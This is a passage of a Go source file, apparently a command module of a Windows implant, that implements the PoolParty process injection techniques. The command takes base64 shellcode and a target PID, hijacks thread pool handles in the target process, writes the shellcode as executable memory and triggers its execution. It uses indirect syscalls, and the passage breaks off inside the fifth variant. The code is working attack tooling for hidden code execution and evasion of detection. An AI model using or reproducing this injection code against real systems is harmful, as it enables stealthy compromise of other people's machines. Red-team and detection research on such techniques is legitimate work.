//go:build windows
// +build windows

// poolpartyinjection.go implements all 8 PoolParty injection techniques based on
// SafeBreach Labs research. Types, constants, and NT API declarations are in
// poolpartyinjection_types.go.
//
// Variants:
//   - Variant 1: Worker Factory Start Routine Overwrite - triggers via NtSetInformationWorkerFactory
//   - Variant 2: TP_WORK Insertion - triggers via task queue processing
//   - Variant 3: TP_WAIT Insertion - triggers via SetEvent
//   - Variant 4: TP_IO Insertion - triggers via async file I/O completion
//   - Variant 5: TP_ALPC Insertion - triggers via NtAlpcConnectPort
//   - Variant 6: TP_JOB Insertion - triggers via AssignProcessToJobObject
//   - Variant 7: TP_DIRECT Insertion - triggers via ZwSetIoCompletion
//   - Variant 8: TP_TIMER Insertion - triggers via NtSetTimer2
//
// Reference: https://github.com/SafeBreach-Labs/PoolParty
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PoolPartyInjectionCommand implements the poolparty-injection command
type PoolPartyInjectionCommand struct{}

// Name returns the command name
func (c *PoolPartyInjectionCommand) Name() string {
	return "poolparty-injection"
}

// Description returns the command description
func (c *PoolPartyInjectionCommand) Description() string {
	return "Perform PoolParty process injection using Windows Thread Pool abuse"
}

// PoolPartyInjectionParams represents the parameters for poolparty-injection
type PoolPartyInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	Variant      int    `json:"variant"`
}

// Execute executes the poolparty-injection command
func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	var params PoolPartyInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	var output string
	switch params.Variant {
	case 1:
		output, err = executeVariant1(shellcode, uint32(params.PID))
	case 2:
		output, err = executeVariant2(shellcode, uint32(params.PID))
	case 3:
		output, err = executeVariant3(shellcode, uint32(params.PID))
	case 4:
		output, err = executeVariant4(shellcode, uint32(params.PID))
	case 5:
		output, err = executeVariant5(shellcode, uint32(params.PID))
	case 6:
		output, err = executeVariant6(shellcode, uint32(params.PID))
	case 7:
		output, err = executeVariant7(shellcode, uint32(params.PID))
	case 8:
		output, err = executeVariant8(shellcode, uint32(params.PID))
	default:
		return errorf("Error: Unsupported variant %d", params.Variant)
	}

	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// executeVariant1 implements Worker Factory Start Routine Overwrite
func executeVariant1(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 1: Worker Factory Start Routine Overwrite\n"
	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
	}
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := injectOpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer injectCloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start routine: 0x%X\n", workerFactoryInfo.StartRoutine)
	output += fmt.Sprintf("[+] Current worker count: %d\n", workerFactoryInfo.TotalWorkerCount)

	// Step 4: Write shellcode to start routine address
	bytesWritten, err := injectWriteMemory(hProcess, workerFactoryInfo.StartRoutine, shellcode)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes to start routine address\n", bytesWritten)

	// Step 5: Increase thread minimum to trigger new worker thread creation
	newMinimum := workerFactoryInfo.TotalWorkerCount + 1
	status, _, _ = procNtSetInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryThreadMinimum),
		uintptr(unsafe.Pointer(&newMinimum)),
		uintptr(unsafe.Sizeof(newMinimum)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Set worker factory thread minimum to: %d\n", newMinimum)
	output += "[+] PoolParty Variant 1 injection completed successfully\n"

	return output, nil
}

// executeVariant2 implements TP_WORK Insertion
func executeVariant2(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 2: TP_WORK Insertion\n"
	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
	}
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := injectOpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer injectCloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 4: Read target process's TP_POOL structure
	var targetTpPool FULL_TP_POOL
	err = injectReadMemoryInto(hProcess, workerFactoryInfo.StartParameter, unsafe.Pointer(&targetTpPool), int(unsafe.Sizeof(targetTpPool)))
	if err != nil {
		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %v", err)
	}
	output += "[+] Read target process's TP_POOL structure\n"

	// Step 5: Get high priority task queue address
	if targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] == 0 {
		return output, fmt.Errorf("high priority task queue is NULL")
	}

	// Read the TPP_QUEUE structure to get the queue LIST_ENTRY
	var targetQueue TPP_QUEUE
	err = injectReadMemoryInto(hProcess, targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH], unsafe.Pointer(&targetQueue), int(unsafe.Sizeof(targetQueue)))
	if err != nil {
		return output, fmt.Errorf("ReadProcessMemory for TPP_QUEUE failed: %v", err)
	}
	output += "[+] Read target process's task queue structure\n"

	// Step 6+7: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)

	// Step 8: Create TP_WORK structure via CreateThreadpoolWork (exactly as SafeBreach does)
	pTpWork, _, err := procCreateThreadpoolWork.Call(
		shellcodeAddr, // Work callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpWork == 0 {
		return output, fmt.Errorf("work item creation failed: %v", err)
	}
	output += "[+] Created TP_WORK structure associated with shellcode\n"

	// Step 9: Read and modify the TP_WORK structure
	var tpWork FULL_TP_WORK
	// Copy the structure from our local process
	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
	}

	// Close the local TP_WORK now that we've copied it
	procCloseThreadpoolWork.Call(pTpWork)

	// Modify: Point Pool to target's TP_POOL
	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter

	// Modify: Point Flink and Blink to the Queue field address in the target process
	// targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] is a pointer to TPP_QUEUE in target
	// We need the address of the Queue field within that TPP_QUEUE
	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))

	// Read current queue state before modifying
	var currentQueueFlink uintptr
	err = injectReadMemoryInto(hProcess, targetQueueListAddr, unsafe.Pointer(&currentQueueFlink), int(unsafe.Sizeof(currentQueueFlink)))
	if err != nil {
		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %v", err)
	}

	var currentQueueBlink uintptr
	err = injectReadMemoryInto(hProcess, targetQueueListAddr+8, unsafe.Pointer(&currentQueueBlink), int(unsafe.Sizeof(currentQueueBlink)))
	if err != nil {
		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %v", err)
	}

	output += fmt.Sprintf("[*] Current queue Flink: 0x%X, Blink: 0x%X (queue list addr: 0x%X)\n", currentQueueFlink, currentQueueBlink, targetQueueListAddr)

	// If queue is empty (points to itself), simple circular list
	// If queue has items, insert at head
	if currentQueueFlink == targetQueueListAddr {
		output += "[*] Queue is empty, creating single-element list\n"
		tpWork.Task.ListEntry.Flink = targetQueueListAddr
		tpWork.Task.ListEntry.Blink = targetQueueListAddr
	} else {
		output += "[*] Queue has existing items, inserting at head\n"
		tpWork.Task.ListEntry.Flink = currentQueueFlink
		tpWork.Task.ListEntry.Blink = targetQueueListAddr
	}

	// Set WorkState exactly as SafeBreach does
	tpWork.WorkState.Exchange = 0x2
	output += "[+] Modified TP_WORK structure for insertion\n"

	// Step 10: Allocate memory for TP_WORK in target process
	tpWorkAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWork)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)

	// Step 11: Write TP_WORK to target
	tpWorkBytes := (*[1 << 20]byte)(unsafe.Pointer(&tpWork))[:unsafe.Sizeof(tpWork)]
	bytesWritten, err := injectWriteMemory(hProcess, tpWorkAddr, tpWorkBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)

	// Step 12: Insert into queue - write remote TP_WORK list entry address to queue's Flink and Blink
	// Calculate the address of our TP_WORK's Task.ListEntry in the target process
	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))

	// Recalculate queue addresses (can't use := since variables already declared)
	targetTaskQueueAddr = targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr = targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))

	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)

	// Update queue's Flink to point to our TP_WORK
	flinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
	_, err = injectWriteMemory(hProcess, targetQueueListAddr, flinkBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %v", err)
	}

	// Update queue's Blink based on whether queue was empty
	var blinkTarget uintptr
	if currentQueueFlink == targetQueueListAddr {
		// Queue was empty, so Blink also points to our work item
		blinkTarget = remoteWorkItemTaskListAddr
	} else {
		// Queue had items, need to update the old first item's Blink to point to us
		// and queue's Blink stays pointing to the last item
		// Actually, for simplicity, SafeBreach just sets both to the new item
		blinkTarget = remoteWorkItemTaskListAddr
	}

	blinkBytes := (*[8]byte)(unsafe.Pointer(&blinkTarget))[:]
	_, err = injectWriteMemory(hProcess, targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), blinkBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %v", err)
	}

	// If there was an existing first item, update its Blink to point to our work item
	if currentQueueFlink != targetQueueListAddr {
		// Calculate the Blink address of the old first item
		// currentQueueFlink points to a LIST_ENTRY, Blink is at offset 8
		oldFirstItemBlinkAddr := currentQueueFlink + 8
		oldBlinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
		_, err = injectWriteMemory(hProcess, oldFirstItemBlinkAddr, oldBlinkBytes)
		if err != nil {
			return output, fmt.Errorf("WriteProcessMemory for old first item Blink failed: %v", err)
		}
		output += "[*] Updated old first item's Blink pointer\n"
	}

	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
	output += "[+] PoolParty Variant 2 injection completed successfully\n"

	return output, nil
}

// executeVariant3 implements TP_WAIT Insertion via Event signaling
func executeVariant3(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 3: TP_WAIT Insertion\n"
	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
	}
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := injectOpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer injectCloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)

	// Step 5: Create TP_WAIT structure via CreateThreadpoolWait
	pTpWait, _, err := procCreateThreadpoolWait.Call(
		shellcodeAddr, // Wait callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpWait == 0 {
		return output, fmt.Errorf("wait item creation failed: %v", err)
	}
	output += "[+] Created TP_WAIT structure associated with shellcode\n"

	// Step 6: Allocate memory for TP_WAIT in target process
	var tpWait FULL_TP_WAIT
	tpWaitAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWait)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_WAIT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_WAIT memory at: 0x%X\n", tpWaitAddr)

	// Step 7: Write TP_WAIT to target process
	tpWaitBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpWait))[:unsafe.Sizeof(tpWait)]
	bytesWritten, err := injectWriteMemory(hProcess, tpWaitAddr, tpWaitBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_WAIT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_WAIT structure (%d bytes)\n", bytesWritten)

	// Step 8: Allocate and write TP_DIRECT separately
	pWaitStruct := (*FULL_TP_WAIT)(unsafe.Pointer(pTpWait))
	var tpDirect TP_DIRECT
	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)

	tpDirectBytes := (*[1 << 20]byte)(unsafe.Pointer(&pWaitStruct.Direct))[:unsafe.Sizeof(tpDirect)]
	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
	}
	output += "[+] Wrote TP_DIRECT structure\n"

	// Step 9: Create event
	eventName, _ := windows.UTF16PtrFromString("PoolPartyEvent")
	hEvent, _, err := procCreateEventW.Call(
		0, // Security attributes
		0, // Manual reset (FALSE)
		0, // Initial state (FALSE)
		uintptr(unsafe.Pointer(eventName)),
	)
	if hEvent == 0 {
		return output, fmt.Errorf("CreateEventW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hEvent))
	output += "[+] Created event 'PoolPartyEvent'\n"

	// Step 10: Associate event with IO completion port via ZwAssociateWaitCompletionPacket
	status, _, _ := procZwAssociateWaitCompletionPacket.Call(
		pWaitStruct.WaitPkt,    // WaitCompletionPacketHandle
		uintptr(hIoCompletion), // IoCompletionHandle
		hEvent,                 // TargetObjectHandle (event)
		tpDirectAddr,           // KeyContext (remote TP_DIRECT)
		tpWaitAddr,             // ApcContext (remote TP_WAIT)
		0,                      // IoStatus
		0,                      // IoStatusInformation
		0,                      // AlreadySignaled (NULL)
	)
	if status != 0 {
		return output, fmt.Errorf("ZwAssociateWaitCompletionPacket failed: 0x%X", status)
	}
	output += "[+] Associated event with target's I/O completion port\n"

	// Step 11: Set event to trigger callback
	ret, _, err := procSetEvent.Call(hEvent)
	if ret == 0 {
		return output, fmt.Errorf("SetEvent failed: %v", err)
	}
	output += "[+] Set event to queue packet to I/O completion port\n"
	output += "[+] PoolParty Variant 3 injection completed successfully\n"

	// Cleanup local TP_WAIT
	procCloseThreadpoolWait.Call(pTpWait)

	return output, nil
}

// executeVariant4 implements TP_IO Insertion via File I/O completion
func executeVariant4(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 4: TP_IO Insertion\n"
	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
	}
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := injectOpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer injectCloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)

	// Step 5: Create file with overlapped flag for async I/O
	fileName, _ := windows.UTF16PtrFromString("C:\\Windows\\Temp\\PoolParty.txt")
	hFile, _, err := procCreateFileW.Call(
		uintptr(unsafe.Pointer(fileName)),
		uintptr(GENERIC_WRITE),
		uintptr(FILE_SHARE_READ|FILE_SHARE_WRITE),
		0, // Security attributes
		uintptr(CREATE_ALWAYS),
		uintptr(FILE_ATTRIBUTE_NORMAL|FILE_FLAG_OVERLAPPED),
		0, // Template file
	)
	if hFile == uintptr(windows.InvalidHandle) {
		return output, fmt.Errorf("CreateFileW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hFile))
	output += "[+] Created file 'C:\\Windows\\Temp\\PoolParty.txt' with overlapped I/O\n"

	// Step 6: Create TP_IO structure via CreateThreadpoolIo
	pTpIo, _, err := procCreateThreadpoolIo.Call(
		hFile,
		shellcodeAddr, // I/O callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpIo == 0 {
		return output, fmt.Errorf("IO item creation failed: %v", err)
	}
	output += "[+] Created TP_IO structure associated with shellcode\n"

	// Step 7: Modify TP_IO - set callback and increment PendingIrpCount
	pIoStruct := (*FULL_TP_IO)(unsafe.Pointer(pTpIo))
	pIoStruct.CleanupGroupMember.Callback = shellcodeAddr // Explicitly set callback
	pIoStruct.PendingIrpCount++                           // Mark async I/O as pending
	output += "[+] Modified TP_IO: set callback and incremented PendingIrpCount\n"

	// Step 8: Allocate memory for TP_IO in target process
	var tpIo FULL_TP_IO
	tpIoAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpIo)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_IO failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_IO memory at: 0x%X\n", tpIoAddr)

	// Step 9: Write TP_IO to target process
	tpIoBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpIo))[:unsafe.Sizeof(tpIo)]
	bytesWritten, err := injectWriteMemory(hProcess, tpIoAddr, tpIoBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_IO failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_IO structure (%d bytes)\n", bytesWritten)

	// Step 10: Calculate remote TP_DIRECT address
	var dummyTpIo FULL_TP_IO
	remoteTpDirectAddr := tpIoAddr + uintptr(unsafe.Offsetof(dummyTpIo.Direct))

	// Step 11: Associate file with target's I/O completion port
	var ioStatusBlock IO_STATUS_BLOCK
	fileCompletionInfo := FILE_COMPLETION_INFORMATION{
		Port: uintptr(hIoCompletion),
		Key:  remoteTpDirectAddr,
	}
	status, _, _ := procZwSetInformationFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&ioStatusBlock)),
		uintptr(unsafe.Pointer(&fileCompletionInfo)),
		uintptr(unsafe.Sizeof(fileCompletionInfo)),
		uintptr(FileReplaceCompletionInformation),
	)
	if status != 0 {
		return output, fmt.Errorf("ZwSetInformationFile failed: 0x%X", status)
	}
	output += "[+] Associated file with target's I/O completion port\n"

	// Step 12: Write to file to trigger I/O completion
	data := []byte("PoolParty injection trigger")
	var overlapped windows.Overlapped
	ret, _, err := procWriteFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		0, // Bytes written (NULL for async)
		uintptr(unsafe.Pointer(&overlapped)),
	)
	// WriteFile returns 0 for pending async operation, which is expected
	_ = ret
	output += "[+] Wrote to file to trigger I/O completion\n"
	output += "[+] PoolParty Variant 4 injection completed successfully\n"

	// Cleanup local TP_IO
	procCloseThreadpoolIo.Call(pTpIo)

	return output, nil
}

// executeVariant5 implements TP_ALPC Insertion via ALPC port messaging
func executeVariant5(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 5: TP_ALPC Insertion\n"
	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
	}
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := injectOpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer injectCloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return output, fmt.Errorf("shellcode alloc+write+protect failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X (W^X: RW→RX)\n", shellcodeAddr)

	// Step 5: Create a temporary ALPC port for TpAllocAlpcCompletion
	var hTempAlpc uintptr
	status, _, _ := procNtAlpcCreatePort.Call(
		uintptr(unsafe.Pointer(&hTempAlpc)),
		0, // ObjectAttributes
		0, // PortAttributes
	)
	if status != 0 {
		return output, fmt.Errorf("NtAlpcCreatePort (temp) failed: 0x%X", status)
	}
	defer windows.CloseHandle(windows.Handle(hTempAlpc))
	output += fmt.Sprintf("[+] Created temporary ALPC port: 0x%X\n", hTempAlpc)

	// Step 6: Allocate TP_ALPC structure via TpAllocAlpcCompletion
	var pTpAlpc uintptr
	status, _, _ = procTpAllocAlpcCompletion.Call(
		uintptr(unsafe.Pointer(&pTpAlpc)),
		hTempAlpc,
		shellcodeAddr, // ALPC callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if status != 0 {
		return output, fmt.Errorf("TpAllocAlpcCompletion failed: 0x%X", status)
	}
	output += "[+] Created TP_ALPC structure associated with shellcode\n"

	// Explicitly set the Direct.Callback to shellcode address (similar to variant 4)
	pAlpcStruct := (*FULL_TP_ALPC)(unsafe.Pointer(pTpAlpc))
	pAlpcStruct.Direct.Callback = shellcodeAddr
	output += "[+] Set Direct.Callback to shellcode address\n"

	// Step 7: Generate random ALPC port name
	portName := fmt.Sprintf("\\RPC Control\\PoolParty%d", pid)
	portNameUTF16, _ := windows.UTF16FromString(portName)

	// Create UNICODE_STRING for port name
	// Length = bytes excluding null terminator, MaximumLength = bytes including null terminator
	var usPortName UNICODE_STRING
	usPortName.Length = uint16((len(portNameUTF16) - 1) * 2)  // UTF-16 code units (minus null) * 2 bytes each
	usPortName.MaximumLength = uint16(len(portNameUTF16) * 2) // Full buffer size in bytes
	usPortName.Buffer = &portNameUTF16[0]

	// Step 8: Create the actual ALPC port with attributes
	var objAttr OBJECT_ATTRIBUTES
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
	objAttr.ObjectName = uintptr(unsafe.Pointer(&usPortName))

	var portAttr ALPC_PORT_ATTRIBUTES
	portAttr.Flags = 0x20000
	portAttr.MaxMessageLength = 328

	var hAlpc uintptr
	status, _, _ = procNtAlpcCreatePort.Call(
		uintptr(unsafe.Pointer(&hAlpc)),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&portAttr)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtAlpcCreatePort failed: 0x%X", status)
	}
	defer windows.CloseHandle(windows.Handle(hAlpc))
	output += fmt.Sprintf("[+] Created ALPC port '%s'\n", portName)

	// Step 9: Allocate memory for TP_ALPC in target process
	var tpAlpc FULL_TP_ALPC
	tpAlpcAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpAlpc)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_ALPC failed: %v", err)
	}
